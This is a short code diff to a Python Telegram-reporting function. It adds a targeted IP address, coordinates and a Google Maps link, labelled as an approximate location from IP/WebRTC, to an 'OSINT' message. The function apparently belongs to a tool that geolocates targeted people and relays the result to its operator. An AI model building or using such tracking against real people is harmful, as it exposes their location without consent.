@@ -50,8 +50,14 @@ def tgram_sender(msg_type, content, token):
         send_request(token, info_message)
 
     if msg_type == 'ip_info':
+        lat = str(json_content.get('lat', ''))
+        lon = str(json_content.get('lon', ''))
+        maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}" if lat and lon else ""
+        map_line = f"🗺 <a href=\"{maps_link}\">[ LOCALISATION APPROXIMATIVE (IP/WebRTC) ]</a>\n" if maps_link else ""
+        
         ip_message = f"""
-<b>🌐 GEOPOL: DÉDIUCTION IP OSINT</b>
+<b>🌐 GEOPOL: DÉDUCTION IP OSINT</b>
+🔍 <b>IP Ciblée :</b> <code>{json_content.get('target_ip_used')}</code>
 
 📍 <b>Continent :</b> {json_content.get('continent')}
 🏳️ <b>Pays :</b> {json_content.get('country')}
@@ -60,6 +66,8 @@ def tgram_sender(msg_type, content, token):
 
 🏢 <b>Fournisseur :</b> <code>{json_content.get('isp')}</code>
 🏛 <b>Organisation :</b> <code>{json_content.get('org')}</code>
+
+{map_line}
 """
         send_request(token, ip_message)
 
